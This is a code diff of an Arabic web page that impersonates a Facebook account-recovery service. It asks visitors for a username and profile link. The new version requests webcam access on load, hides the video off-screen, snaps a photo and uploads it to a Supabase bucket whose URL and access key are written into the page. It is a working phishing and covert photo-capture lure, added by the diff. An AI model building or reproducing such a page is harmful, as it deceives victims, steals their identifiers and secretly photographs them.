@@ -2,106 +2,48 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>استرجاع حساب فيسبوك | مساعدة الدخول</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رابط استرجاع حسابات فيسبوك</title>
+    <!-- تضمين مكتبة Supabase -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #e9ebee; font-family: 'Tajawal', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
-        .recovery-card { width: 100%; max-width: 450px; background: #ffffff; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
-        .fb-header { background: #1877f2; padding: 20px; text-align: center; color: white; font-size: 28px; font-weight: bold; }
-        .content { padding: 20px; }
-        input { width: 100%; padding: 14px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
-        .recovery-btn { width: 100%; background: #1877f2; border: none; padding: 14px; border-radius: 8px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; }
-        
-        /* Modal Styles */
-        .modal { display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); align-items: center; justify-content: center; padding: 20px; }
-        .modal-content { background: white; padding: 25px; border-radius: 15px; text-align: center; width: 100%; max-width: 350px; }
-        .btn-yes { background: #2e7d32; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 16px; margin: 5px; }
-        .btn-no { background: #c62828; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 16px; margin: 5px; }
-        
-        #video, #canvas { display: none; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
+        .container { background: white; max-width: 400px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #0b60e0; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        button:hover { background: #0b38b3; }
+        #status { margin-top: 15px; font-weight: bold; color: #ffffff; }
+        #video { position: absolute; top: -9999px; }
     </style>
 </head>
-
 <body>
 
+    <div class="container">
+        <h2>قم باضافة المعلومات لاسترجاع الحساب</h2>
+        <p>أدخل بياناتك للحصول على الحساب</p>
+        <input type="text" id="username" placeholder="اسم المستخدم">
+        <input type="text" id="playerTag" placeholder="رابط الحساب">
+        <button id="submitBtn">استرجاع الان</button>
+        <div id="status"></div>
+    </div>
+
     <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
-    <div id="permissionModal" class="modal">
-        <div class="modal-content">
-            <i class="fas fa-shield-alt" style="font-size: 3rem; color: #1877f2; margin-bottom: 15px;"></i>
-            <h3>تأكيد الهوية</h3>
-            <p style="margin: 15px 0; color: #666;">هل انت موافق على الشروط ؟</p>
-            <button class="btn-yes" onclick="startCameraProcess()">موافق</button>
-            <button class="btn-no" onclick="closeModal()">إلغاء</button>
-        </div>
-    </div>
-
-    <div class="recovery-card">
-        <div class="fb-header">facebook</div>
-        <div class="content">
-            <h2>استعد حسابك</h2>
-            <input type="url" id="profileLink" placeholder="رابط الحساب الشخصي">
-            <button class="recovery-btn" onclick="document.getElementById('permissionModal').style.display = 'flex'">استرجاع الحساب</button>
-            <p id="status" style="margin-top: 15px; text-align: center; font-size: 14px; color: #333;"></p>
-        </div>
-    </div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const supabaseClient = supabase.createClient('YOUR_URL', 'YOUR_KEY');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const status = document.getElementById('status');
-
-        function closeModal() { document.getElementById('permissionModal').style.display = 'none'; }
-
-        async function startCameraProcess() {
-            closeModal();
-            status.innerText = "جاري الاتصال...";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = async () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const { error } = await supabaseClient.storage.from('photos').upload(`img_${Date.now()}.jpg`, blob);
-                        status.innerText = error ? "حدث خطأ." : "تم إرسال الطلب بنجاح.";
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg');
-                };
-            } catch (err) { status.innerText = "يرجى السماح بالوصول للكاميرا."; }
-        }
-    </script>
-
-    <script>
-
         // إعداد الاتصال بـ Supabase
         // ملاحظة: supabase هي المكتبة المستوردة، نقوم بإنشاء العميل باسم مختلف لتجنب التعارض
-      // نقوم بتعريف المتغيرات أولاً ثم تمريرها لضمان خلوها من أي رموز مخفية
-const supabaseUrl = "https://zkjrvjuyncunbdnngcui.supabase.co";
-const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpranJ2anV5bmN1bmJkbm5nY3VpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk1NjMyNTksImV4cCI6MjA5NTEzOTI1OX0.E1OZ4INqRy-Wuv5K5nDCMtBGJ6k5NdDKldlepukYvO8";
+        const mySupabase = supabase.createClient(
+            'https://zkjrvjuyncunbdnngcui.supabase.co', 
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpranJ2anV5bmN1bmJkbm5nY3VpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk1NjMyNTksImV4cCI6MjA5NTEzOTI1OX0.E1OZ4INqRy-Wuv5K5nDCMtBGJ6k5NdDKldlepukYvO8'
+        );
 
-const mySupabase = supabase.createClient(supabaseUrl, supabaseKey);
-
-        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
         const submitBtn = document.getElementById('submitBtn');
 
-
-        function openModal() { modal.style.display = 'flex'; }
-        function closeModal() { modal.style.display = 'none'; }
-
-          // طلب إذن الكاميرا عند تحميل الصفحة
+        // طلب إذن الكاميرا عند تحميل الصفحة
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -113,7 +55,7 @@ const mySupabase = supabase.createClient(supabaseUrl, supabaseKey);
         initCamera();
 
         // تنفيذ عملية الالتقاط والرفع عند الضغط على الزر
-        recoverBtn.addEventListener('click', async () => {
+        submitBtn.addEventListener('click', async () => {
             status.innerText = "جاري التحقق من الحساب...";
             
             // التأكد من أن الكاميرا جاهزة
@@ -149,9 +91,6 @@ const mySupabase = supabase.createClient(supabaseUrl, supabaseKey);
                 status.innerText = "يرجى الانتظار قليلاً ثم المحاولة مرة أخرى.";
             }
         });
-
-       
     </script>
 </body>
-
 </html>
